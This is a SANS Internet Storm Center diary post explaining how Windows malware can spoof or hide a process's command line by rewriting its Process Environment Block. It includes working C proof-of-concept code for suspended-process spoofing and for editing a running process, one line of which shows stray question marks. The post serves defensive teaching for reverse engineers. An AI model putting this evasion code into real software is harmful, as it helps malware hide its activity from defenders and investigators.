---
title: Malicious Process Environment Block Manipulation, (Fri, Jan 9th)
url: https://isc.sans.edu/diary/rss/32614
source: SANS Internet Storm Center, InfoCON: green
date: 2026-01-09
fetch_date: 2026-01-10T03:33:05.463179
---

# Malicious Process Environment Block Manipulation, (Fri, Jan 9th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Xavier Mertens](/handler_list.html#xavier-mertens "Xavier Mertens")

Threat Level: [green](/infocon.html)

* [previous](/diary/32608)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/amsterdam-march-2026/course/reverse-engineering-malware-advanced-code-analysis) | Amsterdam | Mar 16th - Mar 20th 2026 |

# [Malicious Process Environment Block Manipulation](/forums/diary/Malicious%2BProcess%2BEnvironment%2BBlock%2BManipulation/32614/)

**Published**: 2026-01-09. **Last Updated**: 2026-01-09 08:11:05 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/Malicious%2BProcess%2BEnvironment%2BBlock%2BManipulation/32614/#comments)

Reverse engineers must have a good understanding of the environment where malware are executed (read: the operating system). In a previous diary, I talked about malicious code that could be executed when loading a DLL[[1](https://isc.sans.edu/diary/Abusing%2BDLLs%2BEntryPoint%2Bfor%2Bthe%2BFun/32562)]. Today, I’ll show you how a malware can hide suspicious information related to created processes.

The API call CreateProcess() is dedicated to, guess what, the creation of new processes![[2](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)] I won’t discuss all the parameters here but you have to know to it’s possible to specify some flags that will describe how the process will be created. One of them is CREATE\_SUSPENDED (0x00000004). It will instruct the OS to create the process but not launch it automatically. This flag is usually a good sign of maliciousness (example in case of process hollowing)

Every process has a specific structure called the “PEB” (“Process Environment Block”)[[3](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)]. It’s a user-mode data structure in Windows that the operating system maintains for each running process to store essential runtime information such as loaded modules, process parameters, heap pointers, environment variables, and debugging flags.

The key element in the previous paragraph is **user-mode**. It means that a process is able to access its own PEB (example: to detect the presence of a debugger attached to the process) but also to modify it!

Let’s take a practical example where a malware needs to spawn a cmd.exe with some parameters. We can spoof the command line by modifying the PEB in a few steps:

1. Locate the PEB
2. Read the process parameters
3. Overwrite them
4. Resume the process

Here is a proof-of-concept:

```

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#pragma comment(lib, "ntdll.lib")

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Start a process with some parameters
    BOOL success = CreateProcessA(
        "C:\\Windows\\System32\\cmd.exe",
        (LPSTR)"cmd.exe /c echo I am malicious! }:->",
        NULL, NULL, FALSE,
        CREATE_SUSPENDED,
        NULL, NULL, &si, &pi
    );

    if (success) {
        PROCESS_BASIC_INFORMATION pbi;
        ULONG returnLength;

        // Get the PEB address
        NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);

        // Read ProcessParameters
        PEB peb;
        ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), NULL);

        RTL_USER_PROCESS_PARAMETERS params;
        ReadProcessMemory(pi.hProcess, peb.ProcessParameters, &params, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL);

        // Overwrite the CommandLine buffer
        WCHAR newCmd[] = L"cmd.exe /c echo Nothing to see here!";
        WriteProcessMemory(pi.hProcess, params.CommandLine.Buffer, newCmd, sizeof(newCmd), NULL);
        printf("Press enter to continue and resume the process...\n");
        getchar();

        // Resume the process
        ResumeThread(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        printf("Process resumed with modified PEB.\n");
    }
    return 0;
}
```

Once you launch poc.exe, check the cmd.exe process:

![](https://isc.sans.edu/diaryimages/images/isc-20260109-1.png)

With this scenario, cmd.exe is executed with the **new** parameters. What about modifying a running process and hide (not spoof) its parameters?

To achieve this, the process does not have to be created in suspended state but it must be kept running! The idea is to get a handle on the process and modify its PEB:

```

void modifyRunningProcess(DWORD pid, const wchar_t* newCmd) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return;

    PROCESS_BASIC_INFORMATION pbi;
    ULONG retLen;
    NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);

    PEB peb;
    ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), NULL);

    RTL_USER_PROCESS_PARAMETERS params;
    ReadProcessMemory(hProcess, peb.ProcessParameters, &params, sizeof(params), NULL);

    USHORT newSize = (USHORT)(wcslen(newCmd) * sizeof(WCHAR));
    WriteProcessMemory(hProcess, params.CommandLine.Buffer, newCmd, newSize + 2, NULL);
    WriteProcessMemory(hProcess, (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
???????                       &newSize, sizeof(USHORT), NULL);

    CloseHandle(hProcess);
    printf("PEB Updated for PID: %d\n", pid);
}
```

By aware that this technique has an important limitation, you must replace the existing command line with a less (with trailing spaces) or equal length, otherwise there is a risk of buffer overflow! Finally, this technique will not prevent tools like EDRs to log the orignial parameters because they are logged at process creation. Hopefully!

[1] [https://isc.sans.edu/diary/Abusing+DLLs+EntryPoint+for+the+Fun/32562](https://isc.sans.edu/diary/Abusing%2BDLLs%2BEntryPoint%2Bfor%2Bthe%2BFun/32562)
[2] <https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa>
[3] <https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Commandline](/tag.html?tag=Commandline) [Creation](/tag.html?tag=Creation) [Malware](/tag.html?tag=Malware) [Parameters](/tag.html?tag=Parameters) [PEB](/tag.html?tag=PEB) [Process](/tag.html?tag=Process) [Spoof](/tag.html?tag=Spoof)

[0 comment(s)](/diary/Malicious%2BProcess%2BEnvironment%2BBlock%2BManipulation/32614/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/amsterdam-march-2026/course/reverse-engineering-malware-advanced-code-analysis) | Amsterdam | Mar 16th - Mar 20th 2026 |

* [previous](/diary/32608)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glos...